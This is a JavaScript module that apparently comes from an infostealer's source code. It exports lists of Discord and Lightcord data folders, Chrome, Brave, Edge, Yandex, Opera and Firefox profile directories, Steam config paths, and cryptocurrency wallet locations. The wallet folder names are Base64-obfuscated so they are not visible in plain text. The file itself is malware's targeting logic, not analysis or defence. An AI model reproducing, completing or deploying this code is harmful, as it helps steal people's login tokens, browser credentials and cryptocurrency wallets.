const path = require("path");
const fs = require("fs");
const deobfuscate = require("../functions/utils/decode64")

const APPDATA = process.env.APPDATA || "";
const LOCALAPPDATA = process.env.LOCALAPPDATA || "";
const ProgramFiles = process.env.ProgramFiles || "";
const ProgramFiles86 = process.env["ProgramFiles(x86)"] || "";


/**
 * Generates paths for browser profiles and their Network subdirs.
 *
 * @param {string} base - The base path under LOCALAPPDATA
 * @returns {string[]} The generated paths
 */
function generateBrowserProfiles(base) {
  const profiles = [
    "Default\\",
    "Profile 1\\",
    "Profile 2\\",
    "Profile 3\\",
    "Profile 4\\",
    "Profile 5\\",
    "Guest Profile\\",
  ];

  return profiles.flatMap(profile => [
    path.join(LOCALAPPDATA, base, profile),
    path.join(LOCALAPPDATA, base, profile, "Network")
  ]);
}

/**
 * Retrieves Gecko-based browser profile paths (Firefox, Waterfox, etc.).
 *
 * @param {string} dirPath - Full base path to profiles
 * @returns {string[]} Found Gecko profile directories
 */
function getGeckoProfiles(dirPath) {
  const result = [];

  if (fs.existsSync(dirPath)) {
    const dirs = fs.readdirSync(dirPath, { withFileTypes: true });
    for (const entry of dirs) {
      if (
        entry.isDirectory() &&
        (entry.name.includes(".default-release") || entry.name.includes(".default-default-"))
      ) {
        result.push(path.join(dirPath, entry.name));
      }
    }
  }

  return result;
}

/**
 * Global browser-related path list.
 *
 * @type {string[]}
 */
const paths = [
  // Discord variants
  path.join(APPDATA, "discord"),
  path.join(APPDATA, "discordcanary"),
  path.join(APPDATA, "discordptb"),
  path.join(APPDATA, "discorddevelopment"),
  path.join(APPDATA, "lightcord"),

  // Chrome
  ...generateBrowserProfiles("Google\\Chrome\\User Data\\"),

  // Opera
  path.join(APPDATA, "Opera Software", "Opera Stable\\"),
  path.join(APPDATA, "Opera Software", "Opera GX Stable\\"),

  // Brave
  ...generateBrowserProfiles("BraveSoftware\\Brave-Browser\\User Data\\"),

  // Yandex
  ...generateBrowserProfiles("Yandex\\YandexBrowser\\User Data\\"),

  // Edge
  ...generateBrowserProfiles("Microsoft\\Edge\\User Data\\"),
];

/**
 * Firefox / Waterfox profile paths (Gecko-based browsers).
 *
 * @type {string[]}
 */
const geckoPaths = [
  ...getGeckoProfiles(path.join(APPDATA, "Mozilla", "Firefox", "Profiles")),
  ...getGeckoProfiles(path.join(APPDATA, "Waterfox", "Profiles"))
];

const walletLocalPaths = {
  Bitcoin: path.join(APPDATA, deobfuscate("Qml0Y29pbg=="), "wallets"),
  Zcash: path.join(APPDATA, deobfuscate("WmNhc2g=")),
  Armory: path.join(APPDATA, deobfuscate("QXJtb3J5")),
  Bytecoin: path.join(APPDATA, deobfuscate("Ynl0ZWNvaW4=")),
  Jaxx: path.join(APPDATA, deobfuscate("Y29tLmxpYmVydHkuanh4"), deobfuscate("SW5kZXhlZEJEXy9maWxlX18wLmluZGV4ZWQubGV2ZWxkYg=="), deobfuscate("ZmlsZV9fMC5pbmRleGVkZGI=")),
  Exodus: path.join(APPDATA, deobfuscate("RXhvZHVz"), deobfuscate("ZXhvZHVzLndhbGxldA==")),
  Ethereum: path.join(APPDATA, deobfuscate("RXRoZXJldW0"), deobfuscate("a2V5c3RvcmU=")),
  Electrum: path.join(APPDATA, deobfuscate("RWxlY3RydW0="), deobfuscate("d2FsbGV0cw==")),
  AtomicWallet: path.join(APPDATA, deobfuscate("YXRvbWlj"), deobfuscate("TG9jYWwgU3RvcmFnZQ"), deobfuscate("bGV2ZWxkYg")),
  Guarda: path.join(APPDATA, deobfuscate("R3VhcmRh"), deobfuscate("TG9jYWwgU3RvcmFnZQ"), deobfuscate("bGV2ZWxkYg")),
  Coinomi: path.join(APPDATA, deobfuscate("Q29pbm9taQ=="), deobfuscate("Q29pbm9taQ=="), deobfuscate("d2FsbGV0cw==")),
};


const GamesLocalPaths = {
  DigitalEntitlements: [path.join(LOCALAPPDATA, "DigitalEntitlements")],
  steam: [path.join(ProgramFiles, "steam", "config"), path.join(ProgramFiles86, "steam", "config")]
}

module.exports = { paths, geckoPaths, walletLocalPaths, GamesLocalPaths };
